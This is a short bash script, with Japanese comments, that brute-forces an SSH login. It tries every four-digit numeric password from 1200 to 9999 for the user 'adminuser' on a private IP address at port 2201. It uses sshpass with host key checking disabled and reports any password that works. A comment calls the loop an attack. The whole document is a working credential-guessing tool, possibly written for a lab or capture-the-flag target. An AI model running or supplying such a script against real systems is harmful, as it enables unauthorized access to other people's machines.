#!/bin/bash

HOST="172.31.12.243"
USER="adminuser"
PORT=2201

# PASSは攻撃として数字の1から順に試していく
for i in {1200..9999}; do
    PASS=$(printf "%04d" $i)  # 4桁のゼロパディング
    echo "Trying password: $PASS"
    
    # ssh接続してみて成功するか確認
    sshpass -p "$PASS" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no -p $PORT $USER@$HOST "exit" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "Success! Password is: $PASS"
        exit 0
    fi
done
